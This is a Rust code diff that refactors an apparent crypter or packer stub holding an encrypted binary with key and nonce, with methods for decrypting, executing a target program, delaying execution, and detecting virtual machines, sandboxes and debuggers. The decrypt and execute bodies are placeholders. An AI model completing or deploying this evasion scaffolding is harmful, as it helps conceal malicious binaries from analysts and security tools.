@@ -1,4 +1,4 @@
-pub struct EmbeddedData {
+pub struct Stub {
     cipher_bin: Vec<u8>,
     key: [u8; 32],
     nonce: [u8; 12],
@@ -8,7 +8,7 @@ pub struct EmbeddedData {
 }
 
 impl Stub {
-    pub fn new(
+    fn new(
         cipher_bin : Vec<u8>,
         key: [u8; 32],
         nonce: [u8; 12],
@@ -26,32 +26,36 @@ impl Stub {
         }
     }
 
-    pub fn parse_embedded(self_data: &[u8]) -> Option<EmbeddedData>{
+    fn parse_embedded(self_data: &[u8]) -> Option<Stub>{
         return None;
     }
 
-    pub fn decrypt(stub: &Stub) {
-        if stub.verbose {
+    fn decompress(&self) -> Vec<u8> {
+        todo!()
+    }
+
+    fn decrypt(&self) {
+        if self.verbose {
             println!("[INFO] Binary decrypted successfully.");
         }
     }
 
-    pub fn execute(stub: &Stub) {
-        if stub.verbose {
+    fn execute(&self) {
+        if self.verbose {
                 println!("[INFO] Target program executed.");
         }
     }
 
-    pub fn delay_execution(stub: &Stub) {
-        if stub.delay > 0 {
-            if stub.verbose {
-                println!("[INFO] Delaying execution by {} seconds...", stub.delay);
+    fn delay_execution(&self) {
+        if self.delay > 0 {
+            if self.verbose {
+                println!("[INFO] Delaying execution by {} seconds...", self.delay);
             }
-            std::thread::sleep(std::time::Duration::from_secs(stub.delay));
+            std::thread::sleep(std::time::Duration::from_secs(self.delay));
         }
     }
 
-    pub fn vm_detection(stub: &Stub) -> bool {
+    fn vm_detection(&self) -> bool {
         // =====================================================================
         // WARNING: This is NOT a reliable standalone VM/sandbox check.
         // The crate's heuristics can be outdated, bypassed, or produce
@@ -60,11 +64,11 @@ impl Stub {
         antilysis::detected().unwrap_or(false)
     }
 
-    pub fn anti_debug() -> bool {
+    fn anti_debug() -> bool {
         // =====================================================================
-        // WARNING: This is NOT a reliable standalone anti-debug check.
-        // The detection can be bypassed, hooked, or neutralized by modern
-        // debuggers and analysts. Use it only as a first layer of defense
+        // WARNING: This is NOT a reliable standalone Anti-Debug check.
+        // The crate's heuristics can be outdated, bypassed, or produce
+        // false negatives on modern or custom-configured VMs.
         // =====================================================================
         antidebug::is_debugger_present().unwrap_or(false)
     }
